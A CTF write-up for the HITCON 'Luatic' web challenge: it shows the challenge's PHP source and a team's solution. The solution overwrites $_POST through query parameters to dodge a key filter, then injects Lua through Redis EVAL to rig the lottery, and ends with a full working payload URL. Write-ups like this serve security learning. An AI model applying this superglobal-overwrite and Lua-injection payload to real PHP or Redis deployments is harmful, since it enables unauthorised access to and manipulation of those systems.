# pwnphofun team
# Description
Author of challenge: [@orange_8361](https://twitter.com/orange_8361)
```
Luatic
Win the jackpot!
54.250.242.183
```
# luatic.php
```php
<?php
    /* Author: Orange Tsai(@orange_8361) */
    include "config.php";

    foreach($_REQUEST as $k=>$v) {
        if( strlen($k) > 0 && preg_match('/^(FLAG|MY_|TEST_|GLOBALS)/i',$k)  )
            exit('Shame on you');
    }

    foreach(Array('_GET','_POST') as $request) {
        foreach($$request as $k => $v) ${$k} = str_replace(str_split("[]{}=.'\""), "", $v);
    }

    if (strlen($token) == 0) highlight_file(__FILE__) and exit();
    if (!preg_match('/^[a-f0-9-]{36}$/', $token)) die('Shame on you');

    $guess = (int)$guess;
    if ($guess == 0) die('Shame on you');

    // Check team token
    $status = check_team_redis_status($token);
    if ($status == "Invalid token") die('Invalid token');
    if (strlen($status) == 0 || $status == 'Stopped') die('Start Redis first');

    // Get team redis port
    $port = get_team_redis_port($token);
    if ((int)$port < 1024) die('Try again');
    
    // Connect, we rename insecure commands
    // rename-command CONFIG ""
    // rename-command SCRIPT ""
    // rename-command MODULE ""
    // rename-command SLAVEOF ""
    // rename-command REPLICAOF ""
    // rename-command SET $MY_SET_COMMAND
    $redis = new Redis();
    $redis->connect("127.0.0.1", $port);
    if (!$redis->auth($token)) die('Auth fail');

    // Check availability
    $redis->rawCommand($MY_SET_COMMAND, $TEST_KEY, $TEST_VALUE);
    if ($redis->get($TEST_KEY) !== $TEST_VALUE) die('Something Wrong?');

    // Lottery!
    $LUA_LOTTERY = "math.randomseed(ARGV[1]) for i=0, ARGV[2] do math.random() end return math.random(2^31-1)";
    $seed  = random_int(0, 0xffffffff / 2);
    $count = random_int(5, 10);
    $result = $redis->eval($LUA_LOTTERY, array($seed, $count));

    sleep(3); // Slow down...
    if ((int)$result === $guess)
        die("Congratulations, the flag is $FLAG");
    die(":(");
```
# Team token
```
Token: 7a70261c-xxxx-xxxx-xxxx-7a8a84c655f1
```
# Timeline
- Setup Docker container (of course :v)
- Clear all filters/tests/replacements to find the main solution to bypass lua `math.random` function and win the jackpot
- Bypass `preg_match('/^(FLAG|MY_|TEST_|GLOBALS)/i',$k)` test
- Bypass `str_replace(str_split("[]{}=.'\""), "", $v)` replacement
- Won the jackpot

# Final works
- To win the jackpot, we want to reset the `math.random` function by `math.random = function () returns 123 end`
so `math.random()` will return `123`, equal to `guess` we have sent
- To bypass `preg_match('/^(FLAG|MY_|TEST_|GLOBALS)/i',$k)` test, we use `/luatic.php?token=TEAM_TOKEN&guess=123&_POST[MY_SET_COMMAND]=set&_POST[TEST_KEY]=1&_POST[TEST_VALUE]=1`
so `$_POST` variable will be overwritten to `['MY_SET_COMMAND' => 'set', 'TEST_KEY' => '1', 'TEST_VALUE' => '1']`
and will be extracted to php variables
- To bypass `str_replace(str_split("[]{}=.'\""), "", $v)` replacement, we use `for k, v in pairs(math) do rawset(math, k, function() return 123 end) end` to reset `math.random` function
- Final payload: `/luatic.php?token=TEAM_TOKEN&guess=123&_POST[MY_SET_COMMAND]=eval&_POST[TEST_KEY]=for k, v in pairs(math) do rawset(math, k, function() return 123 end) end&_POST[TEST_VALUE]=0`

and got the Flag: `hitcon{Lua^H Red1s 1s m4g1c!!!}`

Please follow for more informations:
- https://github.com/orangetw/My-CTF-Web-Challenges#luatic
- https://redis.io/commands/eval

